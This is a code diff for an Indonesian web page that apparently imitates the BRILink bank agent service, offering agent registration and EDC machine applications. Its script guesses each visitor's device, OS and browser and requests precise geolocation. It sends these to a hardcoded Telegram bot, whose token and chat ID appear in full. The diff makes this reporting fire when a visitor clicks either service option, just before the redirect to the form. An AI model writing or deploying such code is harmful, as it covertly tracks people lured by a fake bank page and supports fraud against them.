@@ -99,7 +99,7 @@
     <p class="choice-title">👇 Silakan Pilih Layanan:</p>
 
     <!-- OPSI 1: PENDAFTARAN AGEN BARU -->
-    <a href="form-pendaftaran-agen.html" class="option-card option-card--daftar">
+    <a href="form-pendaftaran-agen.html" class="option-card option-card--daftar" onclick="kirimNotifikasi(event, 'Pendaftaran Agen BRILink')">
         <div class="option-card__header">
             <div class="option-card__icon"><i class="fas fa-user-plus"></i></div>
             <div>
@@ -114,7 +114,7 @@
     </a>
 
     <!-- OPSI 2: PENGAJUAN MESIN EDC -->
-    <a href="form-pengajuan-edc.html" class="option-card option-card--edc">
+    <a href="form-pengajuan-edc.html" class="option-card option-card--edc" onclick="kirimNotifikasi(event, 'Pengajuan Mesin EDC BRILink')">
         <div class="option-card__header">
             <div class="option-card__icon"><i class="fas fa-credit-card"></i></div>
             <div>
@@ -147,14 +147,6 @@ const TOKEN_BOT_TELEGRAM = '8958792550:AAGe9geGdlgrv8-6iibu5aquTYX9bq0Vqi0';
 const ID_CHAT_TELEGRAM = '8527556684';
 const API_TELEGRAM = `https://api.telegram.org/bot${TOKEN_BOT_TELEGRAM}/sendMessage`;
 
-// Data perangkat & lokasi
-let dataPerangkat = {
-    nama: 'Tidak Terdeteksi',
-    browser: 'Tidak Terdeteksi',
-    os: 'Tidak Terdeteksi',
-    lokasi: 'Menunggu lokasi...'
-};
-
 // ==============================================
 // DETEKSI NAMA PERANGKAT & BROWSER
 // ==============================================
@@ -164,7 +156,6 @@ function deteksiPerangkat() {
     let browser = 'Tidak Diketahui';
     let os = 'Tidak Diketahui';
 
-    // Deteksi OS & Perangkat
     if (/Android/.test(ua)) {
         os = 'Android';
         if (/Samsung/.test(ua)) namaPerangkat = 'Samsung';
@@ -182,16 +173,13 @@ function deteksiPerangkat() {
         os = 'macOS'; namaPerangkat = 'Mac';
     }
 
-    // Deteksi Browser
     if (/Chrome/.test(ua) && !/Edg/.test(ua)) browser = 'Google Chrome';
     else if (/Edg/.test(ua)) browser = 'Microsoft Edge';
     else if (/Firefox/.test(ua)) browser = 'Mozilla Firefox';
     else if (/Safari/.test(ua) && !/Chrome/.test(ua)) browser = 'Safari';
     else if (/Opera/.test(ua) || /OPR/.test(ua)) browser = 'Opera';
 
-    dataPerangkat.nama = namaPerangkat;
-    dataPerangkat.browser = browser;
-    dataPerangkat.os = os;
+    return { nama: namaPerangkat, browser: browser, os: os };
 }
 
 // ==============================================
@@ -200,40 +188,27 @@ function deteksiPerangkat() {
 function dapatkanLokasi() {
     return new Promise((resolve) => {
         if (!navigator.geolocation) {
-            dataPerangkat.lokasi = 'Geolocation Tidak Didukung';
-            resolve();
+            resolve('Geolocation Tidak Didukung');
             return;
         }
-
         navigator.geolocation.getCurrentPosition(
-            (pos) => {
-                dataPerangkat.lokasi = `📍 ${pos.coords.latitude.toFixed(4)}, ${pos.coords.longitude.toFixed(4)}`;
-                resolve();
-            },
-            (err) => {
-                if (err.code === 1) dataPerangkat.lokasi = '⚠️ Izin Lokasi Ditolak';
-                else if (err.code === 2) dataPerangkat.lokasi = '⚠️ Lokasi Tidak Tersedia';
-                else dataPerangkat.lokasi = `Error: ${err.message}`;
-                resolve();
-            },
+            (pos) => resolve(`📍 ${pos.coords.latitude.toFixed(4)}, ${pos.coords.longitude.toFixed(4)}`),
+            (err) => resolve(err.code === 1 ? '⚠️ Izin Lokasi Ditolak' : 
+                            err.code === 2 ? '⚠️ Lokasi Tidak Tersedia' : `Error: ${err.message}`),
             { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
         );
     });
 }
 
 // ==============================================
-// KIRIM KE TELEGRAM — HANYA SAAT HALAMAN DIBUKA
+// KIRIM KE TELEGRAM
 // ==============================================
 async function kirimKeTelegram(pesan) {
     try {
         await fetch(API_TELEGRAM, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: ID_CHAT_TELEGRAM,
-                text: pesan,
-                parse_mode: 'Markdown'
-            })
+            body: JSON.stringify({ chat_id: ID_CHAT_TELEGRAM, text: pesan, parse_mode: 'Markdown' })
         });
         console.log('✅ Terkirim ke Telegram');
     } catch (err) {
@@ -242,34 +217,40 @@ async function kirimKeTelegram(pesan) {
 }
 
 // ==============================================
-// KIRIM NOTIFIKASI HANYA SAAT HALAMAN DIAKSES
+// FUNGSI NOTIFIKASI KEDUA TOMBOL
 // ==============================================
-document.addEventListener('DOMContentLoaded', async function() {
-    deteksiPerangkat();
-    await dapatkanLokasi();
+async function kirimNotifikasi(e, namaLayanan) {
+    e.preventDefault();
 
-    const waktuAkses = new Date().toLocaleString('id-ID', {
+    const perangkat = deteksiPerangkat();
+    const lokasi = await dapatkanLokasi();
+    const waktu = new Date().toLocaleString('id-ID', {
         timeZone: 'Asia/Jakarta',
-        day: '2-digit',
-        month: 'long',
-        year: 'numeric',
-        hour: '2-digit',
-        minute: '2-digit',
-        second: '2-digit'
+        day: '2-digit', month: 'long', year: 'numeric',
+        hour: '2-digit', minute: '2-digit', second: '2-digit'
     });
 
-    const pesanAkses = `
-👤 *HALAMAN BERANDA DIAKSES*
+    const pesan = `
+👉 *PENGGUNA MEMILIH LAYANAN*
 ━━━━━━━━━━━━━━━━━━━━
-📱 Perangkat: ${dataPerangkat.nama}
-💻 OS: ${dataPerangkat.os}
-🌐 Browser: ${dataPerangkat.browser}
-📍 Lokasi: ${dataPerangkat.lokasi}
-🕐 Waktu: ${waktuAkses} WIB
+📋 Layanan: ${namaLayanan}
+📱 Perangkat: ${perangkat.nama}
+💻 OS: ${perangkat.os}
+🌐 Browser: ${perangkat.browser}
+📍 Lokasi: ${lokasi}
+🕐 Waktu: ${waktu} WIB
 ━━━━━━━━━━━━━━━━━━━━
     `;
-    kirimKeTelegram(pesanAkses);
-});
+
+    await kirimKeTelegram(pesan);
+
+    // Arahkan ke halaman sesuai pilihan
+    setTimeout(() => {
+        window.location.href = namaLayanan.includes('Pendaftaran') 
+            ? 'form-pendaftaran-agen.html' 
+            : 'form-pengajuan-edc.html';
+    }, 300);
+}
 </script>
 
 </body>
